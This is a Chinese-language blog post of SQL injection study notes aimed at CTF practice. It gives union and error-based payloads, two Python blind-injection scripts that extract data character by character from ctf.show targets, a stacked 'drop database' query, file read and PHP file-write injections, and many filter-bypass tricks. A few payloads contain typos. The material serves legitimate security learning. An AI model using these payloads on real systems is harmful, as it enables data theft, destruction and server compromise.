---
title: sql注入总结
date: 2025-04-02 19:11:45
tags: sql注入
categories: 学习笔记
---

### 原理

sql注入发生原理：

用户对传入的参数未进行严格过滤处理，导致构造形成sql语句，直接输入数据库执行，从而获取和修改数据库



#### 注入类型

常见的注入方式有：字符型注入、布尔型注入、报错注入、文件读写注入、布尔盲注、时间盲注、堆叠注入、二次注入......

### 基本操作

**1.判断显示位**

```
?id=SELECT first name, last_name FROM users WHERE user_id = '1' union select 1,2,3#;
```

**2.爆数据库的名字**

```
?id = '1' union select 1,user(),database()--+‘；
```

**3.爆数据库中的表**

```
?id = '-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+';
```

**4.爆表中的字段**

```
?id= '-1'union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+'，
```

 **5.爆相应字段的所有数据**

```
?id = '-1' union select 1,2,group_concat(user,password) from users--+';
```



### 盲注脚本

#### 布尔盲注

```py
import requests
if __name__ == '__main__' :
    url = 'http://8868895d-9164-42b0-a31d-d8ebe2bb0af7.challenge.ctf.show/'
    result = ''
    i = 0
    while True:
        i = i + 1
        low = 32
        high = 127
        while low < high:
            mid = (low + high) // 2
            #payload = f'if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),{i},1))>{mid},1,0)%23'
            #payload = f'if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema="ctfshow"),{i},1))>{mid},1,0)%23'
            #payload = f'if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name="flagba"),{i},1))>{mid},1,0)%23'
            payload = f'if(ascii(substr((select group_concat(flag4sa) from ctfshow.flagba),{i},1))>{mid},1,0)%23'
            # print(payload)
            data={
                "uname":f"admin' and {payload}#",
                "passwd":12346
            }
            r = requests.post(url=url,data=data)
            if 'flag.jpg' in r.text:
                low = mid + 1
            else:
                high = mid
        if low != 32:
            result += chr(low)
        else:
            break
        print(result)

```



#### 时间盲注

```py
import requests
import time
if __name__ == '__main__' :
    url = 'http://5317a3cf-d6d2-4441-b598-9593444bfc12.challenge.ctf.show/?id=1"%20and%20'
    result = ''
    i = 0
    while True:
        i = i + 1
        low = 32
        high = 127
        while low < high:
            mid = (low + high) // 2
            #payload = f'if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),{i},1))>{mid},1,sleep(3))%23'
            #payload = f'if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema="ctfshow"),{i},1))>{mid},1,sleep(2))%23'
            #payload = f'if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name="flagugs"),{i},1))>{mid},1,sleep(2))%23'
            payload = f'if(ascii(substr((select group_concat(flag43s) from ctfshow.flagugs),{i},1))>{mid},1,sleep(2))%23'
            # print(payload)
            stime=time.time()
            r = requests.get(url=url + payload)
            if time.time()-stime<2:
                low = mid + 1
            else:
                high = mid
        if low != 32:
            result += chr(low)
        else:
            break
        print(result)

```



### 注入类型

#### 二次注入

其产生原因是：服务器端虽然对用户的直接输入做了一些过滤或者将一些字符进行转义，但是对于已经存入数据库的信息是完全信任的，即：不校验数据库信息是否合法

利用场景主要有：靶机里同时存在注册和登录页面，且需要获得admin密码



#### 宽字节注入

宽字节就是两个以上的字节，宽字节注入产生的原因就是各种字符编码的不当操作

通常来说，一个gbk编码汉字，占用2个字节。一个utf-8编码的汉字，占用3个字节。因此当我们输入’时，在php代码中如果有过滤的话会利用转义字符\进行转义，而利用urlencode表示的话，就为%5c%27，我们若想要将%5c去掉，则若此时mysql用的是GBK编码，则可以在前面加上一个编码如**%df**，使得系统认定%df%5c表示着一个汉字。

```sql
?id=-1%df%27union select 1,2,group_concat(column_name)from information_schema.columns where table_name=%df'users %df'--+
```



#### 堆叠注入

使用前提：堆叠注入使用的条件很苛刻，会受到API以及数据库引擎，或者是权限的限制。只有当调用数据库的函数支持执行多条SQL语句的时候才可以使用。例如 **mysqli_multi_query()** 函数就支持多条SQL语句同时执行，而 mysqli_query() 函数就不支持。在实际应用中，大多数都使用的是 **mysqli_query()** 函数，所以能使用堆叠注入的说明该网站做的很不成功，因为堆叠注入的爆破效果太好了。一般PHP搭建的网站为了防止SQL注入都会使用 mysqli_query() 函数。

利用方式:在我们输入的语句后面加上分号表示该语句结束，之后再输入另一条语句就可以了。例如可以先写一个查询语句，之后加分号表示查询结束，再在分号后输入删除语句。这样就叫堆叠注入。

```
?id=show database();drop database <数据库名>;
```



#### 文件读取写入注入

##### 文件读取

`union select 1,2,load_file('文件路径')`

```
union select 1,2,load_file('D:/test.txt')
?id=-1 union%20select 1,2,load_file(%27D:/BaiduNetdiskDownload/phpstudy/phpstudy_pro/tet.txt%27)
 （%20是换行，%27是引号，有路径时，防止转义可以将\改为\\或者/）

```



##### 文件写入

**`union select 1,'<?php phpinfo();?>',3 into outfile '文件路径' --+`**

```
union select 1,'<?php phpinfo();?>',3 into outfile 'E:\\phpStudy\\WWW\\sqli\\Less-7\\1.php' --+
此时就将 phpinfo() 的内容写入 E:\phpStudy\WWW\sqli\Less-7 路径下并创建一个1.php文件

```



#### 报错注入

**updatexml（）函数**

- updatexml（）是一个使用不同的xml标记匹配和替换xml块的函数。
- 作用：改变文档中符合条件的节点的值
- 语法： updatexml（XML_document，XPath_string，new_value） 第一个参数：是string格式，为XML文档对象的名称，文中为Doc 第二个参数：代表路径，Xpath格式的字符串例如//title【@lang】 第三个参数：string格式，替换查找到的符合条件的数据
- updatexml使用时，当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）
- 例如： select * from test where ide = 1 and (updatexml(1,0x7e,3)); 由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误。



```
爆出数据库
1' and updatexml(1,concat(0x7e,database(),0x7er),1)#

爆当前数据库表信息
1' and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) #

爆user表字段信息
1' and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='dvwa' and table_name='users'),0x7e),1) #

爆数据库内容、、
1' and updatexml(1,concat(0x7e,(select group_concat(first_name,0x7e,last_name) from dvwa.users)),1) #
```



extractvalue()函数其实与updatexml()函数大同小异，都是通过xpath路径错误报错

```
爆出数据库
1' and extractvalue(1,concat(0x7e,user(),0x7e,database())) #

爆当前数据库表信息
1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) #

爆user表字段信息
1' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))) #

爆数据库内容、、
1' and extractvalue(1,concat(0x7e,(select group_concat(user_id,0x7e,first_name,0x3a,last_name) from dvwa.users))) #

```



### handler命令注入

```sql
HANDLER tbl_name OPEN [ [AS] alias]
HANDLER tbl_name READ index_name { = | <= | >= | < | > } (value1,value2,…) [ WHERE where_condition ] [LIMIT … ]
HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST } [ WHERE where_condition ] [LIMIT … ]
HANDLER tbl_name READ { FIRST | NEXT } [ WHERE where_condition ] [LIMIT … ]
HANDLER tbl_name CLOSE
```



### SQL注入绕过

#### **1.注释字符绕过**

```
-- 注释内容
# 注释内容      url编码为%23
/*注释内容*/
;
/x00
```



#### **2.双写绕过**

绕过场景：代码使用replace将字符代替为空时使用

例如，过滤了select

使用`selselectect =>select`



#### **3.大写绕过**

在正则匹配对大小写不敏感时，也就是正则匹配使用了`\i`，忽略了大小写。而Mysql对大小写也不敏感时使用

例如，

```
/select/i

使用SeLect进行绕过
```



#### **4.内联注释**

**内联注释的作用是增加SQL语句的可移植性。比如，将MySQL特有的语法使用内联注释的形式来编写，在这种情况下，MySQL可以正常的解析并执行内联注释中的代码，但是其它的SQL服务器则忽略内联注释中的内容。**

```
/*! MySQL特有的语法 */
```

例如MySQL服务器可以在以下语句中识别`STRAIGHT_JOIN`关键字，而其他服务器则不能：

```
SELECT /*! STRAIGHT_JOIN*/ col1 FROM table1,table2 WHERE ...
```

/*! */类型的注释，内部语句会被执行

一般用来绕过空格

```
select bbb from table1 where aaa='' union /*! select database()*/;
```



#### **5.特殊编码绕过**

16进制编码绕过

如果在查询字段名的时候表名被过滤，或者是数据库中某些特定字符被过滤，则可以使用16进制绕过。

```
select column_name from information_schema.columns where table_name=0x7573657273;
```

`0x7573657273`为users的16进制编码



#### **6.双重url编码绕过**

对字符串进行二次url编码，可绕过关键字过滤



#### **7.空格绕过**

可以使用%0d(回车)、%0a(换行)、%09(tab制表)、/**/、%a0(&nbsp）、%0b(垂直制表符)、%0c（换页符）



#### 8.过滤了 and、or、=、>、<、regexp

使用 &&、||、 like、greatest(返回值的最大值)、least（返回值的最小值）



#### **9.过滤了逗号**

limit使用from或者offset

select substr(database(0from1for1);select mid(database(0from1for1);



substr使用from for

select * from news limit 0,1 <=> select * from news limit 1 offset 0



if语句使用exp()函数代替

exp()函数除了能用在报错注入以外，利用exp在参数大于709时会报错的特性可以用来构造条件判断语句

```
||exp(710-(... rlike ...))
```

即如果 `(... rlike ...)` 中的语句执行匹配后的结果为`True`，经过减号转换后为 `exp(710-1)` 后不会溢出；若为`false`，转换为 `exp(710-0)` 后则会溢出并报错



#### **10、绕过注释符号（#，--）过滤**

使用单引号、双引号进行引号闭合绕过

```
SELECT * FROM users WHERE id='$_POST[id]' LIMIT 0,1
```

我们传入

```
id=1' and 1=2 union select 1,2,3' 
```

这样语句就变成了

```
SELECT * FROM users WHERE id='1' and 1=2 union select 1,2,3' ' LIMIT 0,1
```

引号正常闭合



#### 11、绕过union，select，where等

可尝试在关键字内插入/**/

```
U/**/NION/**/SE/**/LECT/**/user，pwd from user

union select user,pwd from user
```



#### 12.等价函数绕过

```
hex()、bin() ==> ascii()
sleep() ==>benchmark()
concat_ws()==>group_concat()
mid()、substr() ==> substring()
@@user ==> user()
@@datadir ==> datadir()
```



#### 13.information过滤

`sys.schema_auto_increment_columns`代替`information_schema`，用来对表自增ID的监控

但是 `sys.schema_auto_increment_columns`这个库有些局限性，一般要超级管理员才可以访问sys。

类似可以利用的表还有：`mysql.innodb_table_stats`、`mysql.innodb_table_index`同样存放有库名表名
